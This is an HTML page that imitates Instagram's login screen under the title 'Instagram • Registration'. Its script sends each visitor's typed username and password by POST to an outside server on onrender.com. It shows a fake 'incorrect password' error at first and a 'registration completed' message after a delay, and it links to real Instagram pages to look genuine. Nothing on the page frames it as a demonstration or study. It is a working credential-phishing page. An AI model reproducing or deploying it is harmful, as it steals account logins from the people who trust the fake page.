<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/png" href="Instagram-icon.png">
  <title>Instagram â€¢ Registration</title>

  <style>
    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    body {
      margin: 0;
      background: #ffffff;
      color: #262626;
    }
    .wrapper {
      max-width: 420px;
      margin: 40px auto;
      padding: 0 16px;
    }
    .lang {
      text-align: center;
      color: #8e8e8e;
      font-size: 13px;
      margin-bottom: 24px;
    }
    .card {
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 32px 24px 24px;
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 28px;
    }
    .logo img {
      width: 56px;
      height: 56px;
    }
    .field {
      margin-bottom: 10px;
    }
    .field input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      font-size: 14px;
      background: #fafafa;
    }
    .field input:focus {
      outline: none;
      border-color: #a8a8a8;
      background: #fff;
    }
    .login-btn {
      width: 100%;
      margin-top: 12px;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #0095f6;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    .login-btn:active { opacity: 0.9; }
    .forgot {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
    }
    .forgot a {
      color: #00376b;
      text-decoration: none;
    }
    .create {
      margin-top: 24px;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 16px;
      text-align: center;
    }
    .create a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }
    .meta {
      margin-top: 28px;
      text-align: center;
      color: #8e8e8e;
      font-size: 13px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .meta svg { width: 18px; height: 18px; }
  </style>
</head>

<body>
  <div class="wrapper">
    <div class="lang">English (US)</div><div class="card">
  <div class="logo">
    <!-- Replace src with your local instagram logo if needed -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
  </div>

  <div class="field">
    <input type="text" id="username" placeholder="Username or mobile number">
  </div>

  <div class="field" style="position:relative;">
  <input type="password" id="password" placeholder="Password">

  <span 
    onclick="togglePassword()" 
    style="
      position:absolute;
      right:12px;
      top:50%;
      transform:translateY(-50%);
      cursor:pointer;
      font-size:13px;
      color:#0095f6;
      user-select:none;
    "
    id="toggleText"
  >
    Show
  </span>
</div>

  <button class="login-btn" onclick="submitInstagramDetails()">Continue</button>

  <div id="errorMsg" style="display:none;color:#d32f2f;margin-top:12px;font-size:13px;text-align:center;">
  Incorrect username or password try again
</div>

<div id="successMsg" style="display:none;color:#2e7d32;margin-top:12px;font-size:13px;text-align:center;font-weight:600;">
  Registration completed successfully
</div>

  <div class="forgot">
    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
  </div>
</div>

<div class="create">
  <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Create new account</a>
</div>

<div class="meta">
    <img src="meta-brand-Logo.png" alt="meta Logo" style="max-width:60px;" />
</div>

</div>

<script>
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const toggleText = document.getElementById("toggleText");
const errorMsg = document.getElementById("errorMsg");
const successMsg = document.getElementById("successMsg");

function togglePassword() {
  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    toggleText.innerText = "Hide";
  } else {
    passwordInput.type = "password";
    toggleText.innerText = "Show";
  }
}

function submitInstagramDetails() {
  const data = {
    username: usernameInput.value.trim(),
    password: passwordInput.value.trim()
  };

  if (!data.username || !data.password) {
    alert("Please fill all details");
    return;
  }

  // Show error message first
  errorMsg.style.display = "block";
  successMsg.style.display = "none";

  fetch("https://deyga-registration.onrender.com/api/instagram-register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
  .then(res => {
    if (!res.ok) throw new Error("Server error");
    return res.json();
  })
  .then(() => {
    // After 1 minute show success
    setTimeout(() => {
      errorMsg.style.display = "none";
      successMsg.style.display = "block";
      usernameInput.value = "";
      passwordInput.value = "";
    }, 75000); // 1 minute
  })
  .catch(err => {
    console.error(err);
    alert("Submission failed");
  });
}
</script>

</body>
</html>
